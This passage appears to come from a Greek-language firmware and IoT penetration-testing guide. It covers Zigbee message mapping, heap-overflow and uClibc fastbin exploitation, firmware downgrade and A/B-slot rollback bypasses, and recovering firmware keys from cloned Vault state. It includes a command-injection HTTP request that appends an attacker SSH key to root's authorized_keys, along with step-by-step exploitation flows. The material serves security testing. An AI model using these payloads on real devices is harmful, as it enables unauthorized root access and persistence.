Σε αυτό το στάδιο, χρησιμοποιείται για ανάλυση είτε πραγματικό είτε εξομοιωμένο περιβάλλον συσκευής. Είναι απαραίτητο να διατηρείται πρόσβαση shell στο OS και στο σύστημα αρχείων. Η εξομοίωση ενδέχεται να μην αναπαράγει τέλεια τις αλληλεπιδράσεις με το hardware, οπότε μπορεί να χρειάζονται περιστασιακές επανεκκινήσεις της εξομοίωσης. Η ανάλυση πρέπει να επανεξετάζει το σύστημα αρχείων, να κάνει exploit σε εκτεθειμένες ιστοσελίδες και υπηρεσίες δικτύου και να διερευνά ευπάθειες του bootloader. Οι δοκιμές ακεραιότητας firmware είναι κρίσιμες για τον εντοπισμό πιθανών backdoor ευπαθειών.

## Τεχνικές ανάλυσης κατά τον χρόνο εκτέλεσης

Η ανάλυση κατά τον χρόνο εκτέλεσης περιλαμβάνει την αλληλεπίδραση με μια διεργασία ή ένα binary στο περιβάλλον λειτουργίας του, με τη χρήση εργαλείων όπως τα gdb-multiarch, Frida και Ghidra για τον ορισμό breakpoints και τον εντοπισμό ευπαθειών μέσω fuzzing και άλλων τεχνικών.

Για embedded στόχους χωρίς πλήρες debugger, **αντιγράψτε ένα statically-linked `gdbserver`** στη συσκευή και συνδεθείτε απομακρυσμένα:<sup>[[6]](#references)</sup>

```bash
# On device

```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Αντιστοίχιση μηνυμάτων Zigbee / radio-co-processor

Στα IoT hubs, το RF stack συχνά διαχωρίζεται ανάμεσα σε ένα **radio MCU** και μια διεργασία Linux userland. Μια χρήσιμη ροή εργασίας είναι να χαρτογραφήσετε τη διαδρομή:<sup>[[8]](#references)</sup>

1. **RF frame** στον αέρα
2. **parser στην πλευρά του controller** στο radio MCU
3. **πρωτόκολλο κειμένου ή TLV μέσω serial/UART** που προωθείται στο Linux (για παράδειγμα `/dev/tty*`)
4. **application dispatcher** στον κύριο daemon
5. **handler / state machine ειδικό για το πρωτόκολλο**

Αυτή η αρχιτεκτονική δημιουργεί δύο στόχους για reverse engineering αντί για έναν. Αν ο controller μετατρέπει τα δυαδικά radio frames σε πρωτόκολλο κειμένου, όπως `Group,Command,arg1,arg2,...`, ανακτήστε:

- Τις **ομάδες μηνυμάτων** και τους πίνακες dispatch
- Ποια μηνύματα μπορούν να προέρχονται από το **δίκτυο** και ποια από τον ίδιο τον controller
- Τα ακριβή **πεδία διάκρισης ειδικά για τον κατασκευαστή** (για παράδειγμα, Zigbee `manufacturer_code` και προσαρμοσμένο `cluster_command`)
- Ποιοι handlers είναι προσβάσιμοι μόνο κατά τη **commissioning**, την ανακάλυψη ή τις φάσεις λήψης firmware/model

Ειδικά για το Zigbee, καταγράψτε την κίνηση pairing και ελέγξτε αν ο στόχος εξακολουθεί να βασίζεται στο προεπιλεγμένο **Link Key** `ZigBeeAlliance09`. Αν ισχύει αυτό, η υποκλοπή της κίνησης commissioning μπορεί να αποκαλύψει το **Network Key**. Τα install codes του Zigbee 3.0 μειώνουν αυτή την έκθεση, επομένως σημειώστε αν η συσκευή που δοκιμάζετε τα επιβάλλει όντως.

### Handlers πρωτοκόλλου ειδικοί για τον κατασκευαστή και προσβασιμότητα μέσω FSM

Οι εντολές Zigbee/ZCL ειδικές για τον κατασκευαστή αποτελούν συχνά καλύτερο στόχο από τα τυποποιημένα clusters, επειδή τροφοδοτούν **προσαρμοσμένο κώδικα parsing** και εσωτερικά **FSMs** με λιγότερο δοκιμασμένη επικύρωση.<sup>[[8]](#references)</sup>

Πρακτική ροή εργασίας:

- Κάντε reverse engineering στον command dispatcher μέχρι να εντοπίσετε τον **handler που αφορά μόνο τον κατασκευαστή**.
- Ανακτήστε τους πίνακες **κατάστασης FSM**, **event**, **check**, **action** και **επόμενης κατάστασης**.
- Εντοπίστε τις **μεταβατικές καταστάσεις** που προχωρούν αυτόματα, καθώς και τους κλάδους retry/error που τελικά επαναφέρουν ή αποδεσμεύουν κατάσταση ελεγχόμενη από τον εισβολέα.
- Επιβεβαιώστε ποιες νόμιμες ανταλλαγές πρωτοκόλλου απαιτούνται για να φτάσει ο daemon στην ευάλωτη κατάσταση, αντί να υποθέτετε ότι ο προβληματικός handler είναι πάντα προσβάσιμος.

Για πρωτόκολλα ευαίσθητα στον χρονισμό, η επανάληψη πακέτων από ένα Python framework μπορεί να είναι υπερβολικά αργή. Μια πιο αξιόπιστη προσέγγιση είναι η προσομοίωση νόμιμης συσκευής σε πραγματικό hardware (για παράδειγμα, ένα **nRF52840**) με stack επιπέδου κατασκευαστή, ώστε να μπορείτε να εκθέσετε τα σωστά **endpoints**, **attributes** και τον χρονισμό του commissioning.

### Κατηγορία σφαλμάτων fragmented-download σε embedded daemons

Μια επαναλαμβανόμενη κατηγορία σφαλμάτων firmware εμφανίζεται σε λήψεις **fragmented blob/model/configuration**:<sup>[[8]](#references)</sup>

1. Το **πρώτο fragment** (`offset == 0`) αποθηκεύει το `ctx->total_size` και δεσμεύει μνήμη με `malloc(total_size)`.
2. Τα επόμενα fragments επικυρώνουν μόνο τα ελεγχόμενα από τον εισβολέα πεδία του **τρέχοντος πακέτου**, όπως `packet_total_size >= offset + chunk_len`.
3. Η αντιγραφή χρησιμοποιεί `memcpy(&ctx->buffer[offset], chunk, chunk_len)` χωρίς έλεγχο έναντι του **αρχικού μεγέθους της δεσμευμένης μνήμης**.

Έτσι, ο εισβολέας μπορεί να στείλει:

- Ένα έγκυρο πρώτο fragment με **μικρό** δηλωμένο συνολικό μέγεθος, ώστε να προκαλέσει μικρή δέσμευση heap.
- Ένα μεταγενέστερο fragment με το **αναμενόμενο offset**, αλλά μεγαλύτερο `chunk_len`.
- Ένα πλαστογραφημένο μέγεθος σε επίπεδο πακέτου, που ικανοποιεί τους νέους ελέγχους, ενώ εξακολουθεί να προκαλεί υπερχείλιση του αρχικά δεσμευμένου buffer.

Όταν η ευάλωτη διαδρομή βρίσκεται πίσω από λογική commissioning, η εκμετάλλευση πρέπει να περιλαμβάνει αρκετή **προσομοίωση συσκευής**, ώστε ο στόχος να οδηγηθεί στην αναμενόμενη κατάσταση λήψης model ή blob πριν σταλούν τα κακοσχηματισμένα fragments.

### Ενεργοποίηση `free()` μέσω πρωτοκόλλου

Σε embedded daemons, ο ευκολότερος τρόπος πρόκλησης εκμετάλλευσης heap metadata συχνά δεν είναι η «αναμονή για cleanup», αλλά η **ενεργοποίηση του χειρισμού σφαλμάτων του ίδιου του πρωτοκόλλου**:<sup>[[8]](#references)</sup>

- Στείλτε κακοσχηματισμένα επόμενα fragments για να οδηγήσετε την FSM σε καταστάσεις **retry** ή **error**.
- Υπερβείτε το όριο retries, ώστε ο daemon να **επαναφέρει το context** και να αποδεσμεύσει το αλλοιωμένο buffer.
- Χρησιμοποιήστε αυτό το προβλέψιμο `free()` για να ενεργοποιήσετε primitives από την πλευρά του allocator, πριν η διεργασία καταρρεύσει για άσχετους λόγους.

Αυτό είναι ιδιαίτερα χρήσιμο απέναντι σε allocators τύπου **musl/uClibc/dlmalloc** σε embedded Linux, όπου η αλλοίωση chunk metadata μπορεί να μετατρέψει τη λογική unlink/unbin σε primitive εγγραφής. Ένα σταθερό μοτίβο είναι η αλλοίωση ενός **πεδίου size**, ώστε να ανακατευθυνθεί η διαδρομή του allocator σε **fake chunks που έχουν τοποθετηθεί μέσα στο buffer που υπερχείλισε**, αντί να αλλοιωθούν αμέσως πραγματικοί δείκτες bin και να καταρρεύσει η διεργασία.

## Εκμετάλλευση δυαδικών αρχείων και Proof-of-Concept

Η ανάπτυξη ενός PoC για εντοπισμένες ευπάθειες απαιτεί βαθιά κατανόηση της αρχιτεκτονικής του στόχου και προγραμματισμό σε γλώσσες χαμηλότερου επιπέδου. Οι runtime προστασίες δυαδικών αρχείων σε embedded συστήματα είναι σπάνιες, αλλά, όταν υπάρχουν, ενδέχεται να χρειαστούν τεχνικές όπως το Return Oriented Programming (ROP).

### Σημειώσεις εκμετάλλευσης uClibc fastbin (embedded Linux)

- **Fastbins + consolidation:** Η uClibc χρησιμοποιεί fastbins παρόμοια με αυτά της glibc. Μια μεταγενέστερη μεγάλη δέσμευση μνήμης μπορεί να ενεργοποιήσει το `__malloc_consolidate()`, επομένως κάθε fake chunk πρέπει να περνά τους ελέγχους (εύλογο μέγεθος, `fd = 0` και τα γύρω chunks να θεωρούνται «σε χρήση»).<sup>[[6]](#references)</sup>
- **Δυαδικά αρχεία non-PIE υπό ASLR:** αν το ASLR είναι ενεργοποιημένο αλλά το κύριο δυαδικό αρχείο είναι **non-PIE**, οι διευθύνσεις `.data/.bss` μέσα στο δυαδικό αρχείο παραμένουν σταθερές. Μπορείτε να στοχεύσετε μια περιοχή που μοιάζει ήδη με έγκυρη κεφαλίδα heap chunk, ώστε μια δέσμευση fastbin να καταλήξει σε έναν **πίνακα function pointers**.
- **NUL που διακόπτει τον parser:** όταν γίνεται parsing JSON, ένα `\x00` στο payload μπορεί να διακόψει το parsing, διατηρώντας παράλληλα τα bytes που ακολουθούν και ελέγχονται από τον εισβολέα, για stack pivot/ROP chain.
- **Shellcode μέσω `/proc/self/mem`:** μια ROP chain που καλεί `open("/proc/self/mem")`, `lseek()` και `write()` μπορεί να τοποθετήσει εκτελέσιμο shellcode σε γνωστό mapping και να μεταβεί σε αυτό.

## Επιθέσεις υποβάθμισης firmware και μη ασφαλείς μηχανισμοί ενημέρωσης

Ακόμη και όταν ένας κατασκευαστής υλοποιεί ελέγχους κρυπτογραφικών υπογραφών για εικόνες firmware, συχνά **παραλείπεται η προστασία από επαναφορά έκδοσης (υποβάθμιση)**. Όταν ο boot- ή recovery-loader επαληθεύει μόνο την υπογραφή με ενσωματωμένο δημόσιο κλειδί, αλλά δεν συγκρίνει την *έκδοση* (ή έναν μονοτονικό μετρητή) της εικόνας που εγκαθίσταται, ένας εισβολέας μπορεί νόμιμα να εγκαταστήσει **παλαιότερο, ευάλωτο firmware που εξακολουθεί να έχει έγκυρη υπογραφή** και έτσι να επαναφέρει ευπάθειες που είχαν διορθωθεί.<sup>[[4]](#references)</sup>

Τυπική ροή επίθεσης:

1. **Αποκτήστε μια παλαιότερη υπογεγραμμένη εικόνα**
   * Κατεβάστε την από τη δημόσια πύλη λήψεων, το CDN ή τον ιστότοπο υποστήριξης του κατασκευαστή.
   * Εξαγάγετέ την από συνοδευτικές εφαρμογές για κινητά/υπολογιστές (π.χ. από τον φάκελο `assets/firmware/` μέσα σε ένα Android APK).
   * Ανακτήστε την από αποθετήρια τρίτων, όπως το VirusTotal, αρχεία του Internet, forums κ.λπ.
2. **Ανεβάστε ή διαθέστε την εικόνα στη συσκευή** μέσω οποιουδήποτε εκτεθειμένου καναλιού ενημέρωσης:
   * Web UI, API εφαρμογής για κινητά, USB, TFTP, MQTT κ.λπ.
   * Πολλές καταναλωτικές IoT συσκευές εκθέτουν endpoints HTTP(S) *χωρίς έλεγχο ταυτότητας*, τα οποία δέχονται firmware blobs κωδικοποιημένα σε Base64, τα αποκωδικοποιούν στην πλευρά του server και ξεκινούν recovery/upgrade.
3. Μετά την υποβάθμιση, εκμεταλλευτείτε μια ευπάθεια που διορθώθηκε σε νεότερη έκδοση (για παράδειγμα, ένα φίλτρο command-injection που προστέθηκε αργότερα).
4. Προαιρετικά, εγκαταστήστε ξανά την πιο πρόσφατη εικόνα ή απενεργοποιήστε τις ενημερώσεις για να αποφύγετε τον εντοπισμό, αφού αποκτήσετε persistence.

### Παράδειγμα: Command Injection μετά από υποβάθμιση

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Στο ευάλωτο (υποβαθμισμένο) firmware, η παράμετρος `md5` συνενώνεται απευθείας σε μια εντολή shell χωρίς εξυγίανση, επιτρέποντας την έγχυση αυθαίρετων εντολών (εδώ — την ενεργοποίηση πρόσβασης root μέσω SSH key). Σε μεταγενέστερες εκδόσεις firmware προστέθηκε ένα βασικό φίλτρο χαρακτήρων, αλλά η απουσία προστασίας από downgrade καθιστά την επιδιόρθωση άχρηστη.<sup>[[4]](#references)</sup>

### Εξαγωγή firmware από εφαρμογές για κινητά

Πολλοί προμηθευτές περιλαμβάνουν πλήρεις εικόνες firmware στις συνοδευτικές εφαρμογές τους για κινητά, ώστε η εφαρμογή να μπορεί να ενημερώνει τη συσκευή μέσω Bluetooth/Wi-Fi. Αυτά τα πακέτα αποθηκεύονται συνήθως χωρίς κρυπτογράφηση στο APK/APEX, σε διαδρομές όπως `assets/fw/` ή `res/raw/`. Εργαλεία όπως τα `apktool`, `ghidra` ή ακόμα και το απλό `unzip` σάς επιτρέπουν να εξαγάγετε υπογεγραμμένες εικόνες χωρίς να αγγίξετε το φυσικό υλικό.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Παράκαμψη anti-rollback μόνο μέσω updater σε σχεδιασμούς A/B slot

Ορισμένοι vendors υλοποιούν πράγματι ένα **ratchet** κατά του downgrade, αλλά μόνο στη λογική του *updater* (για παράδειγμα, σε μια ρουτίνα UDS μέσω CAN, σε μια εντολή recovery ή σε έναν OTA agent userspace). Αν ο **bootloader** ελέγχει αργότερα μόνο την υπογραφή/CRC της εικόνας και εμπιστεύεται τον πίνακα διαμερισμάτων ή τα metadata των slot, η προστασία από rollback εξακολουθεί να μπορεί να παρακαμφθεί.<sup>[[7]](#references)</sup>

Τυπικός αδύναμος σχεδιασμός:

- Τα metadata του firmware περιλαμβάνουν τόσο έναν περιγραφέα έκδοσης όσο και ένα **security ratchet** / monotonic counter.
- Ο updater συγκρίνει το ratchet της εικόνας με μια τιμή αποθηκευμένη σε persistent storage και απορρίπτει παλαιότερες υπογεγραμμένες εικόνες.
- Ο bootloader **δεν** αναλύει αυτό το ratchet και επαληθεύει μόνο το header, το CRC και την υπογραφή πριν εκκινήσει το επιλεγμένο slot.
- Η ενεργοποίηση του slot αποθηκεύεται ξεχωριστά σε έναν πίνακα διαμερισμάτων ή σε έναν generation counter ανά slot και **δεν είναι κρυπτογραφικά δεσμευμένη** στο ακριβές firmware digest που επικυρώθηκε.

Αυτό δημιουργεί ένα primitive **validate-one-image / boot-another-image** σε συστήματα dual-slot. Αν ο attacker μπορεί να κάνει τον updater να ορίσει το slot B ως επόμενο στόχο εκκίνησης χρησιμοποιώντας μια τρέχουσα υπογεγραμμένη εικόνα και αργότερα να αντικαταστήσει το slot B πριν από την επανεκκίνηση, ο bootloader μπορεί και πάλι να εκκινήσει την υποβαθμισμένη εικόνα, επειδή εμπιστεύεται μόνο τα ήδη δεσμευμένα metadata του slot.

Συνήθης τρόπος κατάχρησης:

1. Κάντε upload ένα **τρέχον υπογεγραμμένο** firmware στο παθητικό slot και εκτελέστε την κανονική ρουτίνα επικύρωσης/εναλλαγής, ώστε η διάταξη να ορίσει αυτό το slot ως το επόμενο ενεργό.
2. **Μην κάνετε ακόμη reboot**. Επανεισέλθετε στη ρουτίνα προετοιμασίας/διαγραφής slot στην ίδια συνεδρία.
3. Εκμεταλλευτείτε παρωχημένη κατάσταση εκκίνησης ή παρωχημένη λογική επιλογής slot, ώστε ο updater να διαγράψει το **ίδιο φυσικό slot** που μόλις προήχθη.
4. Γράψτε ένα **παλαιότερο αλλά ακόμη υπογεγραμμένο** firmware σε αυτό το slot.
5. Παραλείψτε τη ρουτίνα επικύρωσης που επιβάλλει το ratchet και κάντε απευθείας reboot.
6. Ο bootloader επιλέγει το slot που προήχθη, επαληθεύει μόνο την υπογραφή/ακεραιότητα και εκκινεί την παλιά εικόνα.

Τι να αναζητήσετε κατά το reverse engineering υλοποιήσεων ενημέρωσης A/B:

- Επιλογή slot που βασίζεται σε **flags εκκίνησης** τα οποία δεν ανανεώνονται μετά από επιτυχή εναλλαγή.
- Ρουτίνα τύπου `prepare_passive_slot()` που διαγράφει ένα slot με βάση παρωχημένη κατάσταση αντί για την **τρέχουσα δεσμευμένη διάταξη**.
- Συνάρτηση τύπου `part_write_layout()` που απλώς αυξάνει έναν **generation counter** / active flag και δεν αποθηκεύει το hash της επικυρωμένης εικόνας.
- Έλεγχοι ratchet που υλοποιούνται σε userspace ή στον κώδικα του updater, αλλά **όχι** στα στάδια ROM / bootloader / secure boot.
- Ρουτίνες διαγραφής ή recovery που αφήνουν το slot σημειωμένο ως εκκινήσιμο ακόμη και αφού το περιεχόμενό του διαγραφεί και ξαναγραφτεί.

### Checklist για την αξιολόγηση της λογικής ενημέρωσης

* Είναι επαρκώς προστατευμένα το transport/authentication του *update endpoint* (TLS + authentication);
* Συγκρίνει η συσκευή **αριθμούς έκδοσης** ή έναν **monotonic anti-rollback counter** πριν από το flashing;
* Επαληθεύεται η εικόνα μέσα σε μια αλυσίδα secure boot (π.χ. οι υπογραφές ελέγχονται από κώδικα ROM);
* Επιβάλλει ο **bootloader το ίδιο ratchet** με τον updater, αντί να ελέγχει μόνο την υπογραφή/CRC;
* Είναι τα metadata ενεργοποίησης του slot **δεσμευμένα στο digest/έκδοση του επικυρωμένου firmware**, ή μπορεί να τροποποιηθεί ένα slot μετά την προαγωγή του;
* Μετά από επιτυχή εναλλαγή slot, υποχρεώνεται η συσκευή να κάνει reboot ή παραμένουν προσβάσιμες μεταγενέστερες ρουτίνες ενημέρωσης/διαγραφής στην ίδια συνεδρία;
* Εκτελεί ο κώδικας userland πρόσθετους ελέγχους sanity (π.χ. επιτρεπόμενο partition map, αριθμός μοντέλου);
* Χρησιμοποιούν ξανά οι ροές ενημέρωσης *μερικού* ή *backup* την ίδια λογική επικύρωσης;

> 💡  Αν λείπει οποιοδήποτε από τα παραπάνω, η πλατφόρμα είναι πιθανότατα ευάλωτη σε επιθέσεις rollback.

## Ανάκτηση κλειδιών αποκρυπτογράφησης firmware από ενσωματωμένη κατάσταση KMS/Vault

Όταν μια εικόνα ενημέρωσης συνδυάζει μικρά metadata σε plaintext με ένα μεγάλο blob υψηλής εντροπίας, κάντε πρώτα διαλογή του container πριν δοκιμάσετε brute force:<sup>[[1]](#references)</sup>

- Κάντε dump των headers, offsets και ορίων γραμμών με `hexdump`, `xxd`, `strings -tx`, `base64 -d` και `binwalk -E`.
- Το `Salted__` συνήθως υποδηλώνει μορφή OpenSSL `enc`: τα επόμενα 8 bytes είναι το salt και τα υπόλοιπα bytes είναι ciphertext.
- Ένα πεδίο Base64 που αποκωδικοποιείται σε ακριβώς `256` bytes αποτελεί ισχυρή ένδειξη ότι πρόκειται για ciphertext RSA-2048 που περιέχει τυχαίο κωδικό πρόσβασης/session key του firmware.
- Αποσπασμένο υλικό PGP στο ίδιο αρχείο συχνά προστατεύει μόνο την αυθεντικότητα· μην υποθέσετε ότι χρησιμοποιείται για την εμπιστευτικότητα.

Αν αποτύχει η αναζήτηση στατικών κλειδιών (`grep`, `strings`, αναζητήσεις PEM/PGP), κάντε reverse engineering στη **διαδρομή λειτουργικής αποκρυπτογράφησης** αντί να ψάχνετε μόνο για ιδιωτικά κλειδιά:

- Κάντε decompile το binary του updater / management και ακολουθήστε ποιος διαβάζει το κρυπτογραφημένο blob, ποιο helper/API το αποκρυπτογραφεί και ποιο λογικό όνομα κλειδιού ζητά.
- Αναζητήστε στο εξαγόμενο root filesystem κατάσταση KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), καθώς και αρχεία unit και scripts init.
- Αντιμετωπίστε εντολές plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens ή scripts αυτόματου unseal τοπικού KMS ως ισοδύναμα με υλικό ιδιωτικού κλειδιού.

Αν η συσκευή περιλαμβάνει το αρχικό binary του Vault και το backend αποθήκευσης, η αναπαραγωγή αυτού του περιβάλλοντος είναι συνήθως ευκολότερη από την επανυλοποίηση των εσωτερικών λειτουργιών του Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Με root στο cloned KMS:

- Κάντε τα transit keys exportable μόνο μέσα στο απομονωμένο clone: `vault write transit/keys/<name>/config exportable=true`
- Κάντε export το unwrap key: `vault read transit/export/encryption-key/<name>`
- Δοκιμάστε το RSA key που ανακτήθηκε με το ακριβές ζεύγος padding/hash που χρησιμοποιεί το KMS. Αποτυχία αποκρυπτογράφησης με PKCS#1 v1.5 και αποτυχία αποκρυπτογράφησης με το προεπιλεγμένο OAEP **δεν** αποδεικνύουν ότι το key είναι λανθασμένο· πολλές ροές που βασίζονται στο Vault χρησιμοποιούν OAEP με SHA-256, ενώ οι κοινές βιβλιοθήκες έχουν ως προεπιλογή το SHA-1.
- Αν το payload αρχίζει με `Salted__`, αναπαραγάγετε ακριβώς το OpenSSL KDF του κατασκευαστή (`EVP_BytesToKey`, συχνά MD5 σε παλαιότερες συσκευές) πριν επιχειρήσετε αποκρυπτογράφηση AES-CBC.

Έτσι, το «encrypted firmware» γίνεται ένα πιο γενικό πρόβλημα: **ανακτήστε τα operational keys της συσκευής και, έπειτα, αναπαραγάγετε offline τις ακριβείς παραμέτρους unwrap + KDF**.
